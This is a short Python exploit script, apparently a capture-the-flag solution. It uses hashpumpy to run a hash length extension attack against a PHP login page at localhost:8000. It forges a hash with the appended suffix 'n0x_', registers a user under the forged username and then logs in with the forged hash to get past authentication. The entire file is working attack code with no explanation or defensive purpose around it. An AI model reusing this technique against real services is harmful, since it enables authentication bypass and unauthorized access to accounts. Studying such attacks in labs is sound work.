import hashpumpy
import warnings
import requests

warnings.filterwarnings("ignore", category=DeprecationWarning)

s = requests.session()

hash,username = hashpumpy.hashpump("46eaafcb93f2c5f8fc215cac38e1eaaf",'','n0x_',27)
print(hash,username)

url = "http://localhost:8000/"

register_rep = s.post(url+"register.php",data={"username":username,"password":"mypass"})

login_rep = s.post(url+"login.php",data={"username":username,"password":"mypass","hash":hash})

print(login_rep.text)